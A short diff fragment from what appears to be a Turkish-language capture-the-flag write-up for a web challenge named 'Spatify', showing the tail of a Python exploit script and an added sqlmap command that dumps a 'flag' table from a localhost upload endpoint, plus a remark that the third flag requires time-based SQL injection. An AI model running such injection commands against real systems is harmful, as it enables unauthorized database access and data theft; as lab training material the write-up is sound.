@@ -122,6 +122,8 @@ def pwn_spatify():
 if __name__ == "__main__":
     pwn_spatify()
 ```
+Ayrıca sqlmap çözümü: sqlmap -u "http://localhost:3000/upload" --data="songName=Katarakt&action=check" --method=POST --cookie="connect.sid=COOKIE_DEGERIN" --dbms=postgresql --level=5 --risk=3 -T flag -C flag --dump --batch
+
 ---------------------------------------------
 **NOT**:Her input sanitize edilmiştir mesela login pageden flag tablosuna erişim kısıtlanmıştır bu yüzden yarısmacılar 3. flag için time-based sql kullanması gerekir
 
